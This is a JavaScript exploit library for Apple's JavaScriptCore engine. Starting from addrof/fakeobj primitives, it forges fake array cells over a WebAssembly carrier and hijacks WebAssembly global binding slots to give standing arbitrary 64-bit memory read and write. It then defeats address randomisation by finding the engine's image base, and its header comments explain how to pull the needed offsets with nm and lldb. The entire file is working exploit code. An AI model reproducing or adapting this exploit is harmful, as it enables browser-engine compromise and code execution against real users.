// From addrof/fakeobj
// -> forge a fake ArrayWithDouble over the i64 carrier            (Stage A)
// -> pivot two real double arrays into a JSCell read/write (rwA/rwB)
// -> steal the live ArrayWithDouble header
// -> retarget one Portable global's binding slot at another's      (Stage B)
// -> standing read64 / write64
//
// Usage:
//   const rw = new ArbitraryRW({ addrof, fakeobj });
//   const word = rw.read64(someAddress);
//   rw.write64(someAddress, 0x4141414141414141n);
//   // optional, needs per-build offsets:
//   const { imageBase } = rw.locateImageBase({
//       wasmInstanceSpace: 0x83d0n, preciseSubspaceVtable: 0x1a5a8d8n });
//
// Retrieving the two build-variable offsets for locateImageBase():
// - preciseSubspaceVtable
//   JSCLIB=JavaScriptCore.framework/Versions/1.0.0/JavaScriptCore
//   nm "$JSCLIB" | grep _ZTVN3JSC15PreciseSubspaceE
//   # -> 0000000001a5a8d8 s __ZTVN3JSC15PreciseSubspaceE
//
// - wasmInstanceSpace  (a C++ struct offset):
//   = offsetof(JSC::VM, heap) + offsetof(JSC::Heap, m_webAssemblyInstanceSpace)
//   via lldb:
//     lldb -b -o 'expr -- (size_t)__builtin_offsetof(JSC::VM, heap) \
//                       + (size_t)__builtin_offsetof(JSC::Heap, m_webAssemblyInstanceSpace)' \
//          -o quit "$JSC"

(function (root) {
    "use strict";

    const _cvt = new ArrayBuffer(8);
    const _f64 = new Float64Array(_cvt);
    const _u64 = new BigUint64Array(_cvt);
    const i64 = (v) => BigInt.asIntN(64, v);
    const u64 = (v) => BigInt.asUintN(64, v);
    const toDouble = (v) => { _u64[0] = u64(v); return _f64[0]; };
    const toBits = (v) => { _f64[0] = v; return _u64[0]; };
    const hex = (v) => "0x" + u64(v).toString(16).padStart(16, "0");
    function doubleArray() { const a = new Array(8); for (let i = 0; i < a.length; ++i) a[i] = 13.37 + i; return a; }

    // ---- embedded helper module: i64 carrier + exported mutable i64 global ----
    const WASM_BYTES = new Uint8Array([
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x9f, 0x80, 0x80,
        0x80, 0x00, 0x06, 0x5e, 0x7e, 0x01, 0x60, 0x00, 0x01, 0x64, 0x00, 0x60,
        0x02, 0x64, 0x00, 0x7f, 0x01, 0x7e, 0x60, 0x03, 0x64, 0x00, 0x7f, 0x7e,
        0x00, 0x60, 0x00, 0x01, 0x7e, 0x60, 0x01, 0x7e, 0x00, 0x03, 0x86, 0x80,
        0x80, 0x80, 0x00, 0x05, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x8e, 0x80,
        0x80, 0x80, 0x00, 0x01, 0x7e, 0x01, 0x42, 0x88, 0xef, 0x99, 0xab, 0xc5,
        0xe8, 0x8c, 0x91, 0x11, 0x0b, 0x07, 0xc0, 0x80, 0x80, 0x80, 0x00, 0x06,
        0x0b, 0x6d, 0x61, 0x6b, 0x65, 0x43, 0x61, 0x72, 0x72, 0x69, 0x65, 0x72,
        0x00, 0x00, 0x0a, 0x63, 0x61, 0x72, 0x72, 0x69, 0x65, 0x72, 0x47, 0x65,
        0x74, 0x00, 0x01, 0x0a, 0x63, 0x61, 0x72, 0x72, 0x69, 0x65, 0x72, 0x53,
        0x65, 0x74, 0x00, 0x02, 0x06, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x03,
        0x00, 0x04, 0x67, 0x67, 0x65, 0x74, 0x00, 0x03, 0x04, 0x67, 0x73, 0x65,
        0x74, 0x00, 0x04, 0x0a, 0xc0, 0x80, 0x80, 0x80, 0x00, 0x05, 0x88, 0x80,
        0x80, 0x80, 0x00, 0x00, 0x41, 0xc0, 0x00, 0xfb, 0x07, 0x00, 0x0b, 0x89,
        0x80, 0x80, 0x80, 0x00, 0x00, 0x20, 0x00, 0x20, 0x01, 0xfb, 0x0b, 0x00,
        0x0b, 0x8b, 0x80, 0x80, 0x80, 0x00, 0x00, 0x20, 0x00, 0x20, 0x01, 0x20,
        0x02, 0xfb, 0x0e, 0x00, 0x0b, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x23,
        0x00, 0x0b, 0x86, 0x80, 0x80, 0x80, 0x00, 0x00, 0x20, 0x00, 0x24, 0x00,
        0x0b,
    ]);

    const WASM_MODULE = new WebAssembly.Module(WASM_BYTES);

    class ArbitraryRW {
        constructor(opts) {
            if (!opts || typeof opts.addrof !== "function" || typeof opts.fakeobj !== "function")
                throw new Error("ArbitraryRW requires { addrof, fakeobj }");
            this.addrof = opts.addrof;
            this.fakeobj = opts.fakeobj;

            const o = opts.offsets || opts || {};
            // Build-variable, but all have stable defaults for this engine family.
            this.carrierDataOffset = BigInt(o.carrierDataOffset ?? 0x20);          // sizeof(JSWebAssemblyArray)
            this.arrayBlob = BigInt(o.arrayBlob ?? 0x01082907);    // ArrayWithDouble: indexingType 0x07 | type | flags | cellState
            this.maxArrayLength = BigInt(o.maxArrayLength ?? 0x0fffffff);
            this.sentinel = BigInt(o.sentinel ?? 0x00c0ffee11c0ffeen);
            // Portable-binding-slot search tunables (dynamic probe; rarely need changing).
            this.scanWords = Number(o.scanWords ?? 200);
            this.instanceWindow = BigInt(o.instanceWindow ?? 0x4000);
            this.valueMin = BigInt(o.valueMin ?? 0x100000000n);
            this.valueMax = BigInt(o.valueMax ?? 0x8000000000000n);

            this._log = opts.verbose
                ? (opts.log || (typeof print === "function" ? print : console.log))
                : function () { };

            const carrierExports = new WebAssembly.Instance(WASM_MODULE, {}).exports;
            this._makeCarrier = carrierExports.makeCarrier;
            this._carrierGet = carrierExports.carrierGet;
            this._carrierSet = carrierExports.carrierSet;

            this._live = [];           // keep every cell we depend on reachable
            this._build();
        }

        _build() {
            const addrof = this.addrof, fakeobj = this.fakeobj;
            const makeCarrier = this._makeCarrier;
            const cset = (c, i, v) => this._carrierSet(c, i, i64(v));
            const cget = (c, i) => u64(this._carrierGet(c, i));

            // forge a fake ArrayWithDouble over the GC-untraced i64 carrier.
            const carrier = makeCarrier();
            const carrierAddress = addrof(carrier);
            const payload = carrierAddress + this.carrierDataOffset;
            const fakeButterfly = payload + 3n * 8n;
            const packedLengths = (this.maxArrayLength << 32n) | this.maxArrayLength;
            const BOOTSTRAP_HEADER = this.arrayBlob << 32n;

            cset(carrier, 0, BOOTSTRAP_HEADER);     // fake JSCell header
            cset(carrier, 1, fakeButterfly);        // fake m_butterfly -> carrier slot 3
            cset(carrier, 2, packedLengths);        // fake IndexingHeader (publicLength|vectorLength)
            cset(carrier, 3, 0n);

            let fake = fakeobj(payload);
            fake[0] = toDouble(0x1122334455667788n);
            if (cget(carrier, 3) !== 0x1122334455667788n)
                throw new Error("fake cell does not overlap carrier (wrong carrierDataOffset/arrayBlob for this build?)");

            // Pivot: fake array writes rwA's butterfly to rwB's cell, so rwA[0] then
            // retargets rwB's butterfly -> rwB reads/writes any live JSCell's words.
            const template = doubleArray(), rwA = doubleArray(), rwB = doubleArray();
            const rwAAddress = addrof(rwA), rwBAddress = addrof(rwB);
            cset(carrier, 1, rwAAddress + 8n);
            if (toBits(fake[0]) === 0n) throw new Error("cannot see rwA butterfly through the fake array");
            fake[0] = toDouble(rwBAddress + 8n);
            fake = null;

            const pointAt = (cell) => { rwA[0] = toDouble(addrof(cell) + 8n); };   // word N of a cell == offset 8 + N*8
            const readWord = (cell, index) => { pointAt(cell); return toBits(rwB[index]); };
            const writeWord = (cell, index, value) => { pointAt(cell); rwB[index] = toDouble(value); };

            // Steal the genuine ArrayWithDouble header through the pivot (no hardcoded StructureID).
            const sorted = [template, rwA, rwB].map(addrof).sort((x, y) => (x < y ? -1 : 1));
            rwA[0] = toDouble(sorted[0] + 8n);
            const headerSeed = toBits(rwB[Number((sorted[2] - (sorted[0] + 8n)) / 8n)]);
            if ((headerSeed >> 32n) !== this.arrayBlob)
                throw new Error("stolen header blob mismatch: " + hex(headerSeed));
            this.arrayHeader = headerSeed;

            // find each instance's Portable binding slot by probing — point a
            // candidate word at a carrier word we control and see if global.get hands it
            // back.
            const self = this;
            const sentinelIndex = 21;
            function candidateSlots(instance) {
                const base = addrof(instance);
                const out = [];
                for (let i = 0; i < self.scanWords; ++i) {
                    const word = readWord(instance, i);
                    if (!(word > base && word < base + self.instanceWindow)) continue;
                    const delta = word - (base + 8n);
                    if (delta < 0n || delta % 8n !== 0n) continue;
                    const index = Number(delta / 8n);
                    const value = readWord(instance, index);
                    if (!(value > self.valueMin && value < self.valueMax)) continue;
                    out.push({ index, field: base + 8n + BigInt(index) * 8n, value });
                }
                return out;
            }
            function findGlobalsSlot(instance, get) {
                cset(carrier, sentinelIndex, self.sentinel);
                const candidates = candidateSlots(instance);
                if (candidates.length === 0) throw new Error("m_globals not found in instance payload");
                for (const candidate of candidates) {
                    writeWord(instance, candidate.index, payload + BigInt(sentinelIndex) * 8n);
                    const observed = get();
                    writeWord(instance, candidate.index, candidate.value);
                    if (u64(observed) === self.sentinel) {
                        if (u64(get()) === self.sentinel) throw new Error("global did not restore after probe");
                        return candidate;
                    }
                }
                throw new Error("no instance word behaves as the portable binding slot");
            }
            function prepare(marker) {
                const instance = new WebAssembly.Instance(WASM_MODULE, {});
                const get = instance.exports.gget, set = instance.exports.gset;
                set(marker);
                const slot = findGlobalsSlot(instance, get);
                if (get() !== marker) throw new Error("global lost its marker during slot discovery");
                return { instance, get, set, marker, slot };
            }

            const A = prepare(0x1122334455667788n);
            const B = prepare(0x0000aaaa5555bbbbn);
            writeWord(A.instance, A.slot.index, B.slot.field);   // A's binding slot now -> B's binding slot

            const read64 = (address) => { A.set(i64(address)); return u64(B.get()); };
            const write64 = (address, value) => { A.set(i64(address)); B.set(i64(value)); };

            if (read64(B.slot.value) !== B.marker) throw new Error("alias clobbered B's own global");
            if ((read64(addrof(doubleArray())) >> 32n) !== this.arrayBlob) throw new Error("read64 self-test failed");

            this.read64 = read64;
            this.write64 = write64;
            this._readWord = readWord;
            this._writeWord = writeWord;
            this._A = A; this._B = B;
            this._live.push(carrier, template, rwA, rwB, A.instance, B.instance);
            this._log("[+] ArbitraryRW ready (header " + hex(this.arrayHeader) + ")");
        }

        readBytes(address, n) {
            const out = new Uint8Array(n);
            for (let off = 0; off < n; off += 8) {
                let w = this.read64(address + BigInt(off));
                for (let k = 0; k < 8 && off + k < n; ++k) { out[off + k] = Number(w & 0xffn); w >>= 8n; }
            }
            return out;
        }

        writeBytes(address, bytes) {
            let off = 0;
            for (; off + 8 <= bytes.length; off += 8) {
                let w = 0n;
                for (let k = 7; k >= 0; --k) w = (w << 8n) | BigInt(bytes[off + k]);
                this.write64(address + BigInt(off), w);
            }
            const rem = bytes.length - off;
            if (rem > 0) {                               // read-modify-write the partial tail
                let w = this.read64(address + BigInt(off));
                for (let k = 0; k < rem; ++k)
                    w = (w & ~(0xffn << BigInt(8 * k))) | (BigInt(bytes[off + k]) << BigInt(8 * k));
                this.write64(address + BigInt(off), u64(w));
            }
        }

        // VM -> Heap::m_webAssemblyInstanceSpace -> PreciseSubspace
        // vtable -> JavaScriptCore image base
        locateImageBase(offsets) {
            if (!offsets || offsets.wasmInstanceSpace == null || offsets.preciseSubspaceVtable == null)
                throw new Error("locateImageBase needs { wasmInstanceSpace, preciseSubspaceVtable }");
            const wasmInstanceSpace = BigInt(offsets.wasmInstanceSpace);
            const preciseSubspaceVtable = BigInt(offsets.preciseSubspaceVtable);
            const vmOffset = BigInt(offsets.vmPointerOffset ?? 0x10);   // JSNonFinalObject: cell(8)+butterfly(8) then m_vm
            const vm = this.read64(this.addrof(this._A.instance) + vmOffset);
            if (vm !== this.read64(this.addrof(this._B.instance) + vmOffset)) throw new Error("instances disagree on VM");
            if (!(vm > this.valueMin && vm < this.valueMax)) throw new Error("implausible VM pointer");
            const subspace = this.read64(vm + wasmInstanceSpace);
            const vptr = this.read64(subspace);
            const imageBase = vptr - (preciseSubspaceVtable + 0x10n);                // Itanium two-word vtable header
            if ((imageBase & 0xfffn) !== 0n) throw new Error("image base not page-aligned (wrong preciseSubspaceVtable?)");
            if (BigInt.asUintN(32, this.read64(imageBase)) !== 0xfeedfacfn) throw new Error("no MH_MAGIC_64 at computed image base");
            return { vm, subspace, vptr, imageBase };
        }
    }

    ArbitraryRW.WASM_BYTES = WASM_BYTES;
    ArbitraryRW.WASM_MODULE = WASM_MODULE;
    ArbitraryRW.hex = hex;
    ArbitraryRW.i64 = i64;
    ArbitraryRW.u64 = u64;
    ArbitraryRW.toDouble = toDouble;
    ArbitraryRW.toBits = toBits;

    root.ArbitraryRW = ArbitraryRW;
    if (typeof module !== "undefined" && module.exports) module.exports = ArbitraryRW;
})(typeof globalThis !== "undefined" ? globalThis : this);